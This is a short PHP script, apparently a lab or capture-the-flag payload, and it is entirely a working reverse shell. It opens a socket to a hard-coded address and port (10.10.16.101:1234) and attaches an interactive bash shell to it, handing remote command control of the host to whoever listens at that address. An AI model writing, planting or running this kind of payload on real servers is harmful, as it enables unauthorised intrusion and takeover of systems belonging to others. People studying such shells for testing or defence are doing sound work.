<?php
$ip = "10.10.16.101";
$port = 1234;
$sock = fsockopen($ip, $port);
$proc = proc_open("/bin/bash -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>